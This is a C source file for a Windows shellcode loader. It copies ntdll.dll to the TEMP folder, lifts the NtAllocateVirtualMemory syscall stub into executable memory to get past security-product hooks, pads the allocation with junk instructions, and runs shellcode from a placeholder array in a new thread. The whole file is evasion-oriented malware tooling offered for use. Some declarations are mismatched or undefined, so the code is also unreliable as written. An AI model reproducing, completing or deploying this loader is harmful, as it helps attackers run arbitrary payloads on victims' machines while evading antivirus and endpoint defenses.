#include <windows.h>


#define SHELLCODE_SIZE 0
#define JUNKCODE_SIZE 0
#define OPCODES_SIZE 21
#define NTPROCESS "NtAllocateVirtualMemory"
 

typedef NTSTATUS (NTAPI *_sysNtAllocVirtMem) (
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PULONG RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS _sysNtWriteVirtMem(
   HANDLE ProcessHandle,
   PVOID BaseAddress,
   PVOID Buffer,
   ULONG  NumberOfBytesToWrite,
   PULONG NumberOfBytesWritten OPTIONAL
);


int lenString(char *string);


void concatString(char string1[], char string2[], char* string3);


int main(int argc, char* argv[])
{

    char *tempEnv = getenv("TEMP");
    int tempEnvSize = lenString(tempEnv);
    char *dllNameFile = "\\temp.dll";
    int dllFileSize = lenString(dllNameFile);
    int totalSize = tempEnvSize + dllFileSize;
    char *tempPath = malloc(sizeof(char) * (totalSize + 1)); 
    concatString(tempEnv, dllNameFile, tempPath);
    CopyFileA("C:\\Windows\\System32\\ntdll.dll", tempPath, FALSE);
    HANDLE loadLibr = LoadLibraryA(tempPath);
    char* procAddress = GetProcAddress(loadLibr, NTPROCESS);
    char opcodes[OPCODES_SIZE];
    for (int i = 0; i < OPCODES_SIZE; i++) {   
        opcodes[i] = *(BYTE *)(procAddress + i);
    }

    LPVOID  baseAddressOpcodes = VirtualAlloc(
        NULL, 
        OPCODES_SIZE, 
        MEM_COMMIT|MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );

    CopyMemory(baseAddressOpcodes, opcodes, OPCODES_SIZE);

    _sysNtAllocVirtMem sysNtAllocVirtMem = (_sysNtAllocVirtMem)baseAddressOpcodes;
    unsigned char shellcode[] = {
        //SHELLCODE HERE
    };

    HANDLE currentProccess = GetCurrentProcess();
    char* baseAddress = NULL;
    PULONG regionSize = SHELLCODE_SIZE;
    NTSTATUS success = sysNtAllocVirtMem(
        currentProccess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );

    char* junkcode = malloc(sizeof(char) * (JUNKCODE_SIZE + 1 ));
    for (int i = 0; i < JUNKCODE_SIZE; i += 2) {
        junkcode[i] = 0x89;
        junkcode[i + 1] = 0xc0;
    }

    _sysNtWriteVirtMem(
        -1,
        baseAddress,
        junkcode,
        JUNKCODE_SIZE,
        0
    );

    free(junkcode);
    
    _sysNtWriteVirtMem(
        -1,
        baseAddress + JUNKCODE_SIZE,
        shellcode,
        SHELLCODE_SIZE,
        0
    );

    
    HANDLE hThread = CreateRemoteThread(
        -1,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)baseAddress,
        NULL, 
        0,
        0
    );

   
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}


int lenString(char string[]) 
{
    int i = 0;
    while (string[i++] != '\0');
  
    return i - 1;
}


void concatString(char string1[], char string2[], char* string3)
{
    int i = 0;
    int j = 0;
    while (string1[i] != '\0') {
        string3[j] = string1[i];
        j++;
        i++;
    }
  
    i = 0;
    while (string2[i] != '\0') {
        string3[j] = string2[i];
        j++;
        i++;
    }


    string3[j] = '\0';
}